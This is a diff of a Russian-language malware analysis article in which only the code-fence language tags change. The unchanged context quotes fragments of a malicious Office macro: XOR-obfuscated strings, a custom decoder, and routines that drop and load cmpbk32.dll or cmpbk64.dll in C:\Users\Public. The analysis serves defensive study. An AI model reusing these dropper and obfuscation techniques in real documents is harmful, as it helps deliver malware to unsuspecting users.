@@ -74,7 +74,7 @@ wtf = WriteFile();
 
 Во-первых мы видим, что есть та самая генерация окна с ошибкой Document Error (MsgBox), которую мы уже наблюдали ранее (на рисунке 4), с опечаткой в слове «this». После объявления переменных идёт деобфускация (с помощью Xor и приведения к типу char) байткода и запись в переменные st, bb, cc, dd.
 
-```vb
+```vbnet
 st = Chr(32 Xor CByte(99)) + Chr(83 Xor CByte(105)) + Chr(48 Xor CByte(108)) + Chr(55 Xor CByte(98)) + Chr(6 Xor CByte(117)) + Chr(53 Xor CByte(80)) + Chr(46 Xor CByte(92)) + Chr(0 Xor CByte(115)) + Chr(46 Xor CByte(114)) + Chr(53 Xor CByte(101)) + Chr(6 Xor CByte(115)) + Chr(55 Xor CByte(85)) + Chr(48 Xor CByte(92)) + Chr(83 Xor CByte(58)) + Chr(32 Xor CByte(67))
 bb = Chr(15 Xor CByte(108)) + Chr(1 Xor CByte(108)) + Chr(20 Xor CByte(100)) + Chr(76 Xor CByte(46)) + Chr(89 Xor CByte(50)) + Chr(0 Xor CByte(51)) + Chr(89 Xor CByte(107)) + Chr(76 Xor CByte(98)) + Chr(20 Xor CByte(112)) + Chr(1 Xor CByte(109)) + Chr(15 Xor CByte(99))
 cc = Chr(73) + Chr(78) + Chr(73) + Chr(84)
@@ -89,7 +89,7 @@ cc = INIT.
 
 Здесь C:\Users\Public – директория куда будут дропаться вредоносные файлы cmpbk32.dll и INIT или cmpbk64.dll и INIT (зависит от архитектуры). Далее в функции идёт следующий код:
 
-```vb
+```vbnet
 #If Win64 Then
     
     Dim hd As LongPtr
@@ -117,7 +117,7 @@ cc = INIT.
 
 Зная значения переменных и алиасов мы можем «причесать» код:
 
-```VB
+```vbnet
 #If Win64 Then
     
 
@@ -153,7 +153,7 @@ cc = INIT.
 
 В функции accef34Decode() на вход подаётся строка, которая проходит дефобфускацию через обыкновенные replace():
 
-```VB
+```vbnet
 Function accef34Decode(accef34String As String) As String
   ...
   accef34String = Replace(accef34String, vbCrLf, "")
@@ -179,7 +179,7 @@ Function accef34Decode(accef34String As String) As String
 После чего, сверяется длина строки, необходимо, чтобы строка делилась на 4 без остатка. Далее у нас есть 2 вложенных цикла, в первом чанками по 4 символа идёт перебор, во втором каждый символ из чанка приводится к нужному формату через функции mid, left и др. В конечном итоге на выходе функции мы получаем строку accef34Decode, которая прошла один из этапов деобфускации.
 Эта строка вместе с параметрами: полный путь до файла **(C:\Users\Public\cmpbk32.dll)**, деобфусцированной строкой из предыдущей функции **accef34Decode()**, солью (потребуется для XOR) и смещением, передаётся в функцию **wafll()**.
 
-```VB
+```vbnet
 Private Sub wafll(ByVal st As String, ByVal d As String, salt As Byte, offset As Long)
 
     Dim s11() As Byte
@@ -206,7 +206,7 @@ End Sub
 
 В конце отрабатывает следующий код (привёл к читаемому виду):
 
-```VB
+```vbnet
 Dim hd As LongPtr
     hd = GetModuleHandleA(cmpbk32.dll)
     If Not hd = 0 Then
